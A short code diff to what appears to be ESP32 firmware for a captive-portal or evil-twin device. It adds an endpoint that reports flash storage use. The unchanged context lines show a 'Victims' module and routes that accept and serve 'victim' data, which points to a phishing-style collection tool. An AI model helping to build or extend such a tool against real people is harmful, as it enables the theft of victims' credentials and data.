@@ -2,6 +2,7 @@
 #include <WiFiMulti.h>
 #include <DNSServer.h>
 #include <WebServer.h>
+#include <ArduinoJson.h>
 #include "SPIFFS.h"
 #include "Victims.cpp"
 
@@ -54,8 +55,22 @@ void handleFileRequest(String path) {
     file.close();
 }
 
-// void getMemory(){}
+void getMemory(){
+    size_t totalBytes = SPIFFS.totalBytes();
+    size_t usedBytes = SPIFFS.usedBytes();
+    size_t freeBytes = totalBytes - usedBytes;
 
+    JsonDocument doc;
+    doc["total"] = totalBytes;
+    doc["usado"] = usedBytes;
+    doc["livre"] = freeBytes;
+
+    String jsonString;
+    serializeJson(doc, jsonString);
+
+    webServer.send(200, "application/json", jsonString);
+}
+ 
 void postVictimData() {
     if (webServer.hasArg("plain")) {
         String jsonString = webServer.arg("plain");
@@ -90,6 +105,7 @@ void setup() {
 
     webServer.on("/clear", []() { clear(); });
     webServer.on("/post", []() { postVictimData(); });
+    webServer.on("/memory", []() { getMemory(); });
 
     webServer.on("/victimsjson", []() {
         webServer.send(200, "application/json", victims->getJsonText());
